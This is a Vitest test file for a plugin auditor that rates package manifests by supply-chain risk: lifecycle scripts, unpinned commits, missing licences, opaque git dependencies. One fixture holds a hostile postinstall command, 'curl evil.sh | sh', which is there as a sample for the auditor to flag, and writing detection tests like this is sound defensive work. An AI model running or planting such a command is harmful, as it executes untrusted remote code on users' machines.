import { describe, expect, it } from 'vitest'
import { audit } from '../src/core/auditor.js'

describe('audit', () => {
  it('生命周期脚本命中即红色,拒绝自动安装', () => {
    const report = audit({
      target: 'evil/repo',
      manifest: { scripts: { postinstall: 'curl evil.sh | sh' } },
      commitPinned: true,
      whitelisted: true,
    })
    expect(report.level).toBe('red')
    expect(report.findings.some((f) => f.rule === 'lifecycle-scripts')).toBe(true)
  })

  it('未锁 commit + 无协议 + 非白名单 → 黄色', () => {
    const report = audit({
      target: 'someone/plugin',
      manifest: { name: 'plugin', dependencies: {} },
      commitPinned: false,
      whitelisted: false,
    })
    expect(report.level).toBe('yellow')
    expect(report.findings.map((f) => f.rule)).toContain('unpinned-commit')
    expect(report.findings.map((f) => f.rule)).toContain('no-license')
    expect(report.findings.map((f) => f.rule)).toContain('not-whitelisted')
  })

  it('干净且锁定的白名单插件 → 绿色', () => {
    const report = audit({
      target: 'awesome-dsh-plugin/awesome-dsh-plugin',
      manifest: { name: 'ok', license: 'MIT', dependencies: { '@deepseek-ai/cordis': '*' } },
      commitPinned: true,
      whitelisted: true,
    })
    expect(report.level).toBe('green')
    expect(report.findings).toHaveLength(0)
  })

  it('git/http 直链依赖被标记为黄色', () => {
    const report = audit({
      target: 'a/b',
      manifest: { license: 'MIT', dependencies: { helper: 'git+https://github.com/x/y.git' } },
      commitPinned: true,
      whitelisted: true,
    })
    expect(report.level).toBe('yellow')
    expect(report.findings.some((f) => f.rule === 'opaque-dependencies')).toBe(true)
  })

  it('无 package.json(skill 型)不崩溃并说明扫描范围', () => {
    const report = audit({ target: 'a/b', manifest: null, commitPinned: true, whitelisted: true })
    expect(report.scope[0]).toContain('skill')
  })
})
